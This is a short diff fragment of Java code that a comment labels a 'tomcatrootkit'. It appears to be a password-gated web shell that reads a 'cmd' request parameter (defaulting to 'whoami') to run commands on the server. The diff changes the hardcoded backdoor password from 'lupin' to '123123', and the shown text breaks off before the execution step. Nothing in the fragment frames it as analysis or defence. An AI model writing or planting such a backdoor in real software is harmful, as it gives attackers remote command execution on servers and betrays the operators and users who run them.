@@ -43,7 +43,7 @@
 			// TODO Auto-generated method stub
 			//System.out.println("tomcatrootkit");
 			String pass = req.getParameter("pass");
-			if(pass != null && "lupin".equals(pass)){
+			if(pass != null && "123123".equals(pass)){
 				String cmd = req.getParameter("cmd") == null ? "whoami" : req.getParameter("cmd");
 				StringBuffer sb = new StringBuffer();
 				try{
